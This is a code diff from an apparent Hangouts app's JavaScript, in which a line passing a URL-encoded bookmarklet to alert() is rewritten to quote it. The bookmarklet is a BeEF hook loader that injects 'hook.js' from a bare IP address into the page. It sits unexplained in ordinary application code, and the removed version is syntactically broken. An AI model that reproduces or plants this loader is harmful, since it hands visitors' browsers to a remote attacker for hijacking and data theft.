@@ -251,7 +251,7 @@ function onAnswer(newAnswer) {
   // Gets the temporary hangout id, corresponding to Participant.id
   // rather than Participant.id.
 
-  alert(javascript:%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f54.148.225.212:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})(););
+  alert('javascript:%20(function%20()%20{%20var%20url%20=%20%27http:%2f%2f54.148.225.212:3000%2fhook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();');
 
    
   var myId = getUserHangoutId();
